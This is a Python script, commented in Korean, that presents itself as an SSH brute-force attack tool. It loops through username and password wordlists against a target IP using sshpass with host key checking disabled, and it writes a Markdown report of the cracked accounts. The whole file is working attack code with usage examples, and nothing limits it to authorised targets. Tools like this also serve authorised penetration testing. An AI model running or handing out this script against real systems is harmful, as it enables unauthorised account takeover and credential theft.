#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


def load_wordlist(file_path):
    """워드리스트 파일 로드"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] 파일을 찾을 수 없습니다: {file_path}")
        sys.exit(1)


def ssh_attempt(target, username, password):
    """SSH 접속 시도"""
    # 단순하게 접속만 시도하고 바로 종료
    cmd = [
        'sshpass', '-p', password, 'ssh',
        '-o', 'ConnectTimeout=10',
        '-o', 'StrictHostKeyChecking=no',
        '-o', 'UserKnownHostsFile=/dev/null',
        '-o', 'LogLevel=ERROR',
        f'{username}@{target}',
        'exit'
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        # exit code 0이면 성공적으로 로그인한 것
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print("(타임아웃)")
        return False
    except Exception as e:
        print(f"(에러: {e})")
        return False


def run_bruteforce(target, users, passwords):
    """브루트포스 공격 실행"""
    successful_logins = []
    total_attempts = 0
    start_time = datetime.now()

    print(f"[+] SSH Brute Force 공격 시작")
    print(f"[+] 대상: {target}")
    print(f"[+] 사용자: {len(users)}개, 패스워드: {len(passwords)}개")
    print(f"[+] 총 조합: {len(users) * len(passwords)}개")
    print("=" * 60)

    for i, username in enumerate(users, 1):
        print(f"\n[*] 사용자 테스트 중 ({i}/{len(users)}): {username}")

        for j, password in enumerate(passwords, 1):
            total_attempts += 1
            print(f"[{total_attempts:4d}] {username}:{password} ", end="")

            if ssh_attempt(target, username, password):
                print("✓ 성공!")
                print(f"[+] 인증 성공: {username}:{password}")
                successful_logins.append((username, password))
                break
            else:
                print("✗ 실패")

            time.sleep(0.3)  # 공격 속도 조절

        if successful_logins and successful_logins[-1][0] == username:
            print(f"[*] {username} 계정 크랙 완료, 다음 사용자로 이동")

    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()

    print("\n" + "=" * 60)
    print(f"[+] 공격 완료!")
    print(f"[+] 소요 시간: {duration:.1f}초")
    print(f"[+] 총 시도: {total_attempts}회")
    print(f"[+] 성공: {len(successful_logins)}개")

    if successful_logins:
        print(f"[+] 발견된 계정:")
        for username, password in successful_logins:
            print(f"    → {username}:{password}")
    else:
        print("[-] 유효한 계정을 찾지 못했습니다")

    return {
        'successful_logins': successful_logins,
        'total_attempts': total_attempts,
        'duration': duration,
        'start_time': start_time,
        'end_time': end_time
    }


def create_report(results, target, users_file, passwords_file, output_file):
    """마크다운 보고서 생성"""
    users = load_wordlist(users_file)
    passwords = load_wordlist(passwords_file)

    # 출력 디렉토리 생성
    Path(output_file).parent.mkdir(parents=True, exist_ok=True)

    success_rate = (len(results['successful_logins']) / results['total_attempts'] * 100) if results['total_attempts'] > 0 else 0

    report = f"""# SSH Brute Force Attack Report

## 🎯 공격 정보
- **대상 IP**: `{target}`
- **공격 시작**: {results['start_time'].strftime('%Y-%m-%d %H:%M:%S')}
- **공격 종료**: {results['end_time'].strftime('%Y-%m-%d %H:%M:%S')}
- **소요 시간**: {results['duration']:.1f}초

## 📊 통계
- **총 시도**: {results['total_attempts']:,}회
- **성공**: {len(results['successful_logins'])}개
- **실패**: {results['total_attempts'] - len(results['successful_logins']):,}회
- **성공률**: {success_rate:.2f}%

## 🔓 탈취된 계정
"""

    if results['successful_logins']:
        report += "\n| 사용자명 | 패스워드 |\n|----------|----------|\n"
        for username, password in results['successful_logins']:
            report += f"| `{username}` | `{password}` |\n"
    else:
        report += "\n**✅ 유효한 계정을 찾지 못했습니다.**\n"

    report += f"""
## 📝 테스트 상세정보

### 사용자 목록 ({len(users)}개)
```
{chr(10).join(users)}
```

### 패스워드 목록 ({len(passwords)}개)  
```
{chr(10).join(passwords)}
```

---
*보고서 생성 시간: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
"""

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(report)

    print(f"[+] 보고서 저장됨: {output_file}")


def main():
    parser = argparse.ArgumentParser(
        description='SSH Brute Force Attack Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python ssh_brute.py 192.168.1.100 -u user.txt -p password.txt -o report.md
  python ssh_brute.py 10.0.0.50 --users userlist.txt --passwords passlist.txt
        """
    )

    parser.add_argument('target', help='대상 IP 주소')
    parser.add_argument('-u', '--users', required=True, help='사용자명 목록 파일')
    parser.add_argument('-p', '--passwords', required=True, help='패스워드 목록 파일')
    parser.add_argument('-o', '--output', default='ssh_bruteforce_report.md', help='출력 보고서 파일명')

    args = parser.parse_args()

    # 실시간 출력을 위한 설정
    sys.stdout.reconfigure(line_buffering=True)

    print("🔧 SSH Brute Force Attack Tool")
    print(f"📋 사용자 파일: {args.users}")
    print(f"📋 패스워드 파일: {args.passwords}")
    print(f"📄 출력 파일: {args.output}")

    try:
        # 워드리스트 로드
        users = load_wordlist(args.users)
        passwords = load_wordlist(args.passwords)

        if not users:
            print("[-] 사용자 목록이 비어있습니다")
            sys.exit(1)
        if not passwords:
            print("[-] 패스워드 목록이 비어있습니다")
            sys.exit(1)

        # 브루트포스 공격 실행
        results = run_bruteforce(args.target, users, passwords)

        # 보고서 생성
        create_report(results, args.target, args.users, args.passwords, args.output)

    except KeyboardInterrupt:
        print("\n[-] 사용자에 의해 중단됨")
        sys.exit(1)
    except Exception as e:
        print(f"[-] 오류 발생: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()